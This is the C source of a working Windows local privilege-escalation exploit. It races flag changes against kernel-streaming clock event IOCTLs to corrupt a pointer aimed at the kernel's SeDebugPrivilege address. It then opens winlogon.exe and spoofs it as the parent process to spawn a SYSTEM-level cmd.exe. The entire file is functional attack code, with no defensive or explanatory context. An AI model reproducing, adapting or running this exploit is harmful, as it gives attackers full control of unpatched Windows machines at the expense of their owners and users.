#define __STREAMS__
#define _INC_MMREG
#include <Windows.h>
#include <winternl.h>
#include <strmif.h>
#include <ks.h> 
#include <ksproxy.h>
#include <ksmedia.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "headers.h"

#pragma comment(lib, "ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdllp.lib")
#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "Advapi32.lib")

#define KSEVENTF_KSWORKITEM 0x00000080
#define CORE_ID_0 0
#define CORE_ID_1 1

KSEVENT _event;
MY_KSEVENT_TIME_INTERVAL _event_time;
MY_KSEVENTDATA _event_data;

void CreateProcessFromHandle(HANDLE hProcess) {
    int error;
    BOOL status;
    SIZE_T size = 0;
    LPVOID lpValue = NULL;
    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = NULL;
    wchar_t cmd_process[] = L"C:\\Windows\\System32\\cmd.exe";


    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // Initialize the thread attribute list
    do
    {
        status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
        error = GetLastError();

        if (!status)
        {
            if (si.lpAttributeList != NULL)
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
            ZeroMemory(si.lpAttributeList, size);
        }
    } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

    // Update the thread attribute with the parent process handle
    do
    {
        if (!status)
        {
            printf("[-] Failed to initialize thread attribute list.\n");
            printf("    |-> %d\n", error);
            break;
        }

        lpValue = HeapAlloc(GetProcessHeap(), 0, sizeof(HANDLE));
        memcpy(lpValue, &hProcess, sizeof(HANDLE));

        status = UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            lpValue,
            sizeof(HANDLE),
            NULL,
            NULL);

        if (!status)
        {
            error = GetLastError();
            printf("[-] Failed to update thread attribute.\n");
            printf("    |-> %d\n", error);
            break;
        }

        status = CreateProcessW(NULL, (LPWSTR)cmd_process, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &si.StartupInfo, &pi);

        if (!status)
        {
            error = GetLastError();
            printf("[-] Failed to create new process.\n");
            printf("    |-> %d\n", error);
        }
        else
        {
            printf("[+] New process created successfully.\n");
            printf("    |-> PID : %lu\n", pi.dwProcessId);
            printf("    |-> TID : %lu\n", pi.dwThreadId);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    } while (0);

    // Clean up allocated memory
    if (lpValue != NULL)
        HeapFree(GetProcessHeap(), 0, lpValue);

    if (si.lpAttributeList != NULL)
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
}

DWORD GetProcessIDByName(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int Spawn_CMD() {
    DWORD winlogonPID;

    winlogonPID = GetProcessIDByName(L"winlogon.exe");
    if (winlogonPID == 0) {
        printf("Failed to find winlogon.exe process.\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, winlogonPID);
    if (!hProcess) {
        printf("OpenProcess failed. LastError: %lu\n", GetLastError());
        return 1;
    }

    CreateProcessFromHandle(hProcess);
    CloseHandle(hProcess);
    return 0;
}

void FlipFlags() {
    ULONG xor_mask_flags = KSEVENT_TYPE_ENABLE ^ KSEVENT_TYPE_QUERYBUFFER;

    SetThreadAffinityMask(GetCurrentThread(), 1i64 << CORE_ID_0);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    while (1) {
        _event.Flags ^= xor_mask_flags;
        Sleep(5);
    }
}

void SetClockState(HANDLE hDevice, KSSTATE state) {
    KSPROPERTY ksProperty = { 0 };
    ksProperty.Set = KSPROPSETID_Clock;
    ksProperty.Id = KSPROPERTY_CLOCK_STATE;
    ksProperty.Flags = KSPROPERTY_TYPE_SET;

    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDevice,
        IOCTL_KS_PROPERTY,
        &ksProperty,
        sizeof(ksProperty),
        &state,
        sizeof(state),
        &bytesReturned, NULL)) {
        printf("[-] SetClockState. LastError: 0x%x\n", GetLastError());
    }
}

int main(int argc, char* argv[])
{

    if (argc != 2) {
        printf("Usage: %s <nt!SeDebugPrivilege VA>\n", argv[0]);
        exit(1);
    }

    ULONGLONG NtSeDebugPrivilegeVA = strtoull(argv[1], NULL, 16);

    HANDLE hDevice = NULL;  

    _event = {};
    _event.Flags = KSEVENT_TYPE_ENABLE;
    _event.Set = KSEVENTSETID_Clock;
    _event.Id = KSEVENT_CLOCK_INTERVAL_MARK;

    _event_data = {};
    _event_data.NotificationType = KSEVENTF_KSWORKITEM;
    _event_data.KsWorkItem.KsWorkerObject = NtSeDebugPrivilegeVA - 0x5C;

    _event_time = {};
    _event_time.EventData = _event_data;
    _event_time.Interval = 30000000LL;
    _event_time.TimeBase = 30000000LL;

    printf("[+] Starting race condition...\n");
    HANDLE hRaceThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FlipFlags, NULL, 0, NULL);

    SetThreadAffinityMask(GetCurrentThread(), 1i64 << CORE_ID_1);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

    int count = 0;
    while (count < 3) {

        HRESULT hr = KsOpenDefaultDevice(
            KSCATEGORY_CLOCK,
            GENERIC_READ | GENERIC_WRITE,
            &hDevice
        );

        if (hDevice == NULL) {
            printf("[-] KsOpenDefaultDevice failed (HRESULT: 0x%X)\n", hr);
            return 1;
        }

        SetClockState(hDevice, KSSTATE_RUN);
        Sleep(2900);

        while (1) {
            if (DeviceIoControl(hDevice, IOCTL_KS_ENABLE_EVENT, &_event, sizeof(KSEVENT) + 0x10, &_event_time, sizeof(MY_KSEVENT_TIME_INTERVAL), nullptr, nullptr)) {
                Sleep(1500);
                SetClockState(hDevice, KSSTATE_STOP);
                CloseHandle(hDevice);
                printf("[+] Race condition succeeded in %d out of 3 attempts\n", count + 1);
                count += 1;
                break;
            }
        }
    }

    Spawn_CMD();

    return 0;
}